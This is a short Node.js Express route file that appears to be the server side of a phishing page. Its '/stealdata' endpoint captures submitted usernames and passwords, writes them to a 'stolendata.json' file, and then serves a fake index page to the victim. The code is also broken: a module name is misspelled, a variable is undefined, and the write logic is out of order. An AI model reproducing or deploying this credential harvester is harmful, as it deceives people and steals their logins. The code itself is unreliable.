var express = require('express');
var path = require('path');
var jsonfile = require('jsonfile');
var bodyParser = require('body-parser');
var fs = require('fs');

var router = express.Router();
router.use(bodyParser.json());
router.use(bodyParser.urlencoded({ extended: false}));

var dir = './Data';
var file = './Data/stolendata.json';

function handlePostRequest(req, res) {
	var userName = req.body.username;
	var userPassword = req.body.password;

	jsonFile.writeFile(file, obj, {flag: 'a'}, function(err) {
		var user = {Username: userName, Password: userPassword};
		obj.Users.push(user);
	})

	// Serve fake static files (fakeindex.html)
	if (process.env['RUNNING_VIA_DOCKER']) {
	    res.sendFile(path.join(__dirname, '../Public/index.html'));
	} else {
	    res.sendFile(path.join(__dirname, '../../Client/index.html'));
	}
}

router.post('/stealdata', function(req, res) {
	handlePostRequest(req, res);
})

module.exports = router;